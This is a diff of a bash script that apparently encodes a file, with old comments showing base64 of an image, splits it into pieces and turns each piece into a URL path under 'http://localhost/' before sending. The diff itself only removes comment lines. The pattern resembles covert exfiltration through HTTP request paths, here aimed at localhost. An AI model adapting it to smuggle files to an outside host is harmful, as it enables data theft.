@@ -41,18 +41,12 @@ echo "Organizating the file..."
 tr -s '[:space:]' '\n' < /tmp/ax0c.txt > /tmp/ax0d.txt
 FILE="/tmp/ax0d.txt"
 
-#HITS=`cat /tmp/ax0d.txt | wc -l`
-#echo $FILE
-
 echo " "
 echo "Doing the magic ;)"
 ### doing same magic... preparing file to be sent...
 for i in $(cat $FILE); do
         echo "http://localhost/$i" >> /tmp/ax0a.txt
 done
-
-### send the pattern 
-
 
 
 echo "Send the file..."
@@ -68,23 +62,3 @@ done
 
 echo " "
 echo "Done!"
-
-
-
-
-### old stuffs
-#echo ${ENCODED:0:77}
-
-#echo " "
-
-#echo ${ENCODED:77:77}
-
-#echo " " 
-
-#echo ${ENCODED:200:100}
-
-
-#NUM=$(base64 Desktop/6.jpg | wc -m)
-
-#echo $(($NUM/100))
-#
